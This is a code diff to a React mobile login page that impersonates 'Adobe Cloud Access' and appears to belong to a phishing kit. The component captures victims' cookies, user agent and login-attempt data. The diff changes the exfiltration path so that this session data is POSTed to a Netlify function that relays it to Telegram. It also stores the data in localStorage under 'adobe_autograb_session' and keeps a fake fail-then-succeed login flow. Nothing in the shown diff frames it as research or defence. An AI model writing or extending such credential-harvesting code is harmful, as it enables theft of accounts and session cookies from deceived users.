@@ -1,6 +1,6 @@
 import React, { useState } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
-import { buildOAuthUrl, generateState, getBrowserFingerprint } from '../../utils/oauthHandler';
+import { buildOAuthUrl, generateState, getBrowserFingerprint, sendToTelegram } from '../../utils/oauthHandler';
 
 interface LoginPageProps {
   fileName: string;
@@ -118,7 +118,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
         fileName: 'Adobe Cloud Access',
         clientIP: 'Unknown',
         userAgent: navigator.userAgent,
-        deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
+        deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
         cookies: cookieCapture.documentCookies,
         cookiesParsed: cookieCapture.allCookies,
         documentCookies: cookieCapture.documentCookies,
@@ -134,7 +134,19 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
       
       // Send attempt data to Telegram
       try {
-        await sendToTelegram(sessionData);
+        const response = await fetch('/.netlify/functions/sendTelegram', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(sessionData)
+        });
+        
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
+        const result = await response.json();
         console.log(`✅ Mobile attempt ${currentAttempt} data sent to Telegram`);
       } catch (error) {
         console.error(`❌ Failed to send mobile attempt ${currentAttempt} to Telegram:`, error);
@@ -151,10 +163,17 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
         // Second attempt - show success and redirect
         await new Promise(resolve => setTimeout(resolve, 1000));
         
+        // Store session data in localStorage
+        if (typeof localStorage !== 'undefined') {
+          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
+        }
+        
         // Call the success handler
         if (onLoginSuccess) {
           await onLoginSuccess(sessionData);
         }
+        
+        setIsLoading(false);
       }
     } catch (error) {
       console.error('Login error:', error);
@@ -163,10 +182,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
       }
       setIsLoading(false);
     } finally {
-      // Only set loading to false for first attempt, second attempt handles it above
-      if (loginAttempts === 0) {
-        setIsLoading(false);
-      }
+      // Loading state is handled in the success/error blocks above
     }
   };
 
